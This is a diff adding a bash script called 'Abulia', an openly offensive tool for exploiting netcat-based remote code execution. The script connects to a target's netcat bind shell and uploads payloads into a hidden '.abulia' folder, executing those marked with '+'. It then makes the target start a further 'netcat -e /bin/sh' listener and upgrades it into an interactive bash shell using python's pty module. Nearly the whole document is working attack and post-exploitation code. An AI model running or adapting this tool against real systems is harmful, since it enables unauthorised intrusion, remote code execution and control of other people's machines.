@@ -1,0 +1,167 @@
+#!/bin/bash
+################################################################################
+# ABULIA
+################################################################################
+# Full-featured tool for taking advantage of netcat-based remote code
+# execution.
+#
+# Will connect to [host] over port [port] using netcat before:
+#   - Opening a pipeline between the attacker and the target.
+#   - Immediately begin uploading individual payloads to the target to
+#     $PWD/.abulia on the target system
+#   - Immediately execute payloads marked for execution.
+#     Targets may collaboratively generate a $PWD/.abulia/abuliarc
+#   - Open a reverse python-shell via a different pipeline that then sources
+#     $PWD/.abulia/abuliarc
+#
+# Payloads are marked for execution by prepending them with a '+' on the
+# command line.
+################################################################################
+# TODO: massive code cleanup.
+################################################################################
+# Pre-Flight Checklist:
+#   - ensure ports [port], [port]+1 and [port]+2 are open on the target system.
+#   - ensure the current directory on the target system is writeable.
+#   - target system: netcat -e /bin/sh -lp [port]
+################################################################################
+if [ "$2" == "" ]; then
+	echo "Usage: ./abulia <host> <port> [[+]payload1 [[+]payload2 [[+]payload3 [...]]]]";
+	exit;
+fi
+
+################################################################################
+# Setup a misery pipeline: an abulia-only FIFO.
+################################################################################
+mkpipeline(){
+	FIFO=$(mktemp -u --suffix="-abulia")
+	xargs mkfifo       <<<"$FIFO";
+	xargs chmod 700    <<<"$FIFO";
+
+	echo "[@] mkpipeline> Successfully setup pipeline to $FIFO" 1>&2;
+
+	echo $FIFO;
+}
+################################################################################
+# Begin sending everything from this FIFO to the target system to be executed
+# as command.
+################################################################################
+mkabulia(){
+#	tail -f $3 | netcat -c "$1" "$2" 2>"/dev/stderr" 1>"/dev/stdout" &
+
+	sleep 0.2s;
+	GET_PID=$(mktemp -u --suffix="-abulia");
+
+	tail -f $3 | netcat -c "$1" "$2" 2>"/dev/stderr" 1>"/dev/stdout" &
+
+	# Initialise abulia directory:
+	echo "mkdir -p '$ABULIA_TARGET' ; cd '$ABULIA_TARGET'" > "$3"
+
+	echo "[@] mkabulia> Successfully setup abulia to $1 over port $2 <$3" 1>&2;
+}
+
+################################################################################
+# Send a payload to the host system.
+################################################################################
+mkpayload(){
+	if [ ! -f "$ABULIA_PAYLOAD/$1" ]; then
+		echo "[!] mkpayload> no payload '$1'" 1>&2;
+		exit;
+	fi
+
+	OUTPUT=$(basename "$1");
+
+	echo "netcat -lp $3 > '$OUTPUT' &" >> "$4" &
+
+	sleep 0.2s;
+	GET_PID=$(mktemp -u --suffix="-abulia");
+
+	(dd if="$ABULIA_PAYLOAD/$1" of="/dev/stdout" status=progress & echo "$!" >&3) 3>"$GET_PID" | netcat $2 $3 &
+	PIDOF="$!"
+
+	while [[ $(cat "$GET_PID" | xargs ps h) ]]; do
+		sleep 0.2s;
+	done;
+
+	kill "$PIDOF";
+	sleep 0.2s;
+	rm -f "$GET_PID";
+
+	echo "[@] mkpayload> transfer finished."
+	echo "[@] mkpayload> setup '$1' done" 1>&2;
+}
+
+################################################################################
+# Mark payload as executable, then execute it.
+################################################################################
+payloadsh(){
+	echo "chmod +x ./$1">> "$2"
+	echo "sh -c ./$1">> "$2" &
+	echo "[.] payloadsh> executing '$1'" 1>&2;
+}
+
+################################################################################
+# Variables; modify these to suit your system.
+################################################################################
+ABULIA_PAYLOAD=($(pwd)"/payloads/");
+ABULIA_TARGET=("./.abulia/");
+ABULIA_LOG=($(pwd)"/log/abulia-"$(date +%F-+%R));
+################################################################################
+# Other networking and communication variables.
+################################################################################
+ABULIA_PORT="$2";
+ABULIA_TRANSFER=$(($ABULIA_PORT+1));
+ABULIA_SHELL=$(($ABULIA_TRANSFER+1));
+ABULIA_HOST="$1";
+
+ABULIA_FIFO=$(mkpipeline);
+
+################################################################################
+# Begin execution of Abulia
+################################################################################
+# Setup out netcat pipe
+mkabulia	$ABULIA_HOST	$ABULIA_PORT	$ABULIA_FIFO;
+
+################################################################################
+# 'abuliarc' is a required payload.
+################################################################################
+mkpayload	"abuliarc"	$ABULIA_HOST	$ABULIA_TRANSFER 	$ABULIA_FIFO
+
+################################################################################
+# Cycle through individual payloads, loading them as needed.
+################################################################################
+CMD_ARG_COUNT=3
+while [ "$CMD_ARG_COUNT" -le "$#" ]; do
+	eval "arg=\${$CMD_ARG_COUNT}";
+	mkpayload $(sed 's/^+//' <<< "$arg") $ABULIA_HOST	$ABULIA_TRANSFER	$ABULIA_FIFO;
+	CMD_ARG_COUNT=$((CMD_ARG_COUNT + 1));
+done
+
+################################################################################
+# Cycle through payloads marked for execution and execute them.
+################################################################################
+CMD_ARG_COUNT=3;
+while [ "$CMD_ARG_COUNT" -le "$#" ]; do
+	eval "arg=\${$CMD_ARG_COUNT}";
+	grep -q '^+' <<<"$arg" && payloadsh $(sed 's/^+//' <<< "$arg") $ABULIA_FIFO;
+	CMD_ARG_COUNT=$((CMD_ARG_COUNT + 1));
+done;
+
+################################################################################
+# Attempt to reshell.
+################################################################################
+echo "[@] abulia> payloads executed; attempting reshell on port $ABULIA_SHELL"
+
+echo "netcat -e /bin/sh -vlp $ABULIA_SHELL &" > "$ABULIA_FIFO";
+sleep 1s;
+
+echo "[@] abulia> netcat running on target. Removing FIFOs..." 
+rm -f "$ABULIA_FIFO"
+
+echo "[@] abulia> attempting to shell. Fingers crossed..."
+
+WIDTH=$(stty size  | cut -d ' ' -f 2)
+HEIGHT=$(stty size | cut -d ' ' -f 1)
+
+stty raw -echo;
+cat <(echo "stty raw -echo; cd ..; python -c 'import pty; pty.spawn(\"/bin/bash\")'") <(echo -e "stty size rows $HEIGHT cols $WIDTH 2>/dev/null; export ABULIA_LOCATION='$ABULIA_TARGET'; source '$ABULIA_TARGET/abuliarc'; stty -raw echo 2>/dev/null;") - | netcat "$ABULIA_HOST" "$ABULIA_SHELL";
+stty -raw echo;
